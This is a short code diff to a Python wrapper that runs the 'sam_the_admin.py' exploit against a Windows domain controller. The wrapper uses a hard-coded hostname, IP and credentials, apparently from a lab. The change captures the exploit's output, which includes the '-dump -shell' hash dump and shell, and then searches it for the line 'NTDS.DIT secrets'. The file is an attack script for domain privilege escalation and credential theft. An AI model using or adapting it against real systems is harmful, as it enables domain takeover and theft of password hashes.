@@ -1,4 +1,5 @@
 import os
+import subprocess
 
 # Variable definitions (with help of recon)
 hostname = "WIN-CQKL0KHIEF1"
@@ -19,4 +20,10 @@ os.system(cmd)
 # Exploiting and getting the hashes
 # Example : python3 sam_the_admin.py -dc-host WIN-CQKL0KHIEF1.stb2018.local -dc-ip 10.0.2.4 stb2018/DEVILLE:f9uf6
 cmd = "python3 sam_the_admin.py -dc-host " + dc_host + " -dc-ip " + dc_ip + " -admin-username " + adminUsername + " -dump -shell " + creds
-os.system(cmd)
+os.system("script -O output.txt -c \'" + cmd + "\'")
+
+with open("output.txt") as f:
+    data = f.readlines()
+    for line,content in enumerate(data):
+        if "NTDS.DIT secrets" in content:
+            print(line)
